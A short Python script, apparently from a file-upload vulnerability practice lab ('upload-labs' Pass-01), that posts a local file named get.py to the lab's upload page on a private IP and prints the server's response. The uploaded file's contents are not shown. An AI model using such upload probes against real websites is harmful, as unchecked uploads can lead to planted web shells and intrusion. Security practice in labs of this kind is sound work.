import requests 

url = 'http://10.10.10.139/upload-labs/Pass-01/index.php'

uploadFile = {
    "upload_file":open("get.py","rb")
}

postData = {
    "submit":"上传"
}

res = requests.post(url = url,files = uploadFile,data = postData)
print(res.text)
print(res.url)
print(res.status_code)
input()